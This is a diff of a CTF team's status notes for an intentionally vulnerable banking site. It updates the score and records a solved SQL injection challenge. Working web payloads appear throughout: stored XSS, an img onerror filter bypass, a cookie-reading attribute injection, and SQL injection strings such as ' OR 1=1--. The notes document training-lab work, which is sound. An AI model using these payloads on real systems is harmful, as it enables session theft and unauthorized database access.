@@ -1,7 +1,7 @@
 # DarkMoney CTF — Status & Solutions
 
-**Competition:** Schwab 2026 Advanced | **Team score:** 2160 | **Team rank:** improving  
-**Progress:** 15 of 37 challenges solved  
+**Competition:** Schwab 2026 Advanced | **Team score:** 2420 | **Team rank:** improving  
+**Progress:** 16 of 37 challenges solved  
 **Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
 **Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
 **Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)
@@ -27,12 +27,18 @@
 | By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
 | The Prophecy That Speaks | Trex | 200 | XSS filter bypass — `POST /api/oracle/markets` with `<img src=x onerror=alert(1)>` in description (script tag blocked but img onerror bypasses V1 filter) |
 | Between the Lines | Trex | 250 | HTML attribute injection via unescaped `"` in bill-pay memo — `$A()` renders `title="${memo}"` without escaping quotes; payload: `x" onmouseover="alert(document.cookie)` |
+| Honest Answers | Alpaca | 260 | SQLi — `GET /api/transactions?search='` causes DB 500 error; single quote breaks query syntax |
 
-**Total earned: 2160 pts**
+**Total earned: 2420 pts**
 
 ---
 
 ## 🔄 IN PROGRESS (incomplete challenges)
+
+### Honest Answers — 260 pts
+- `GET /api/transactions?search='` → HTTP 500 (DB error — unescaped quote breaks SQL query)
+- crwd-ctrl auto-detected on the 500 response
+- Further SQLi: `' OR 1=1--` returns all transactions (bypass filter), `' OR '1'='1` also works
 
 ### Between the Lines — 250 pts
 - `$A(e.memo)` function creates `<span class="memo-note" title="${n}">${s}</span>`
@@ -40,16 +46,6 @@
 - Payload: `x" onmouseover="alert(document.cookie)` → creates `title="x" onmouseover="alert(document.cookie)"`
 - `POST /api/bill-pay/payments` with memo payload, then navigate to `/bill-pay/payments/{id}`
 - crwd-ctrl auto-detected when payment detail page loaded
-
-### Honest Answers (Alpaca)
-- **Vector:** SQL injection in transaction search field
-- **Hint:** "Hand the transaction search something it can't assemble. I want the fault, not the answer: a broken one talks — it gives up what it meant to keep, and cannot help itself. Force that, then come back and check here."
-- **Steps:**
-  1. Find the transaction search endpoint (probably `GET /api/transactions?search=...`)
-  2. Send SQLi payload to cause a DB error that leaks schema/data
-  3. Error message reveals backend DB info = proof of injection
-- **Payloads to try:** `'`, `' OR '1'='1`, `'; SELECT version(); --`
-- **API:** `GET /api/transactions?search=' OR 1=1--`
 
 ### Frozen Assets (Alpaca)
 - **Vector:** Bypass UI restriction to fund bill payment from frozen account
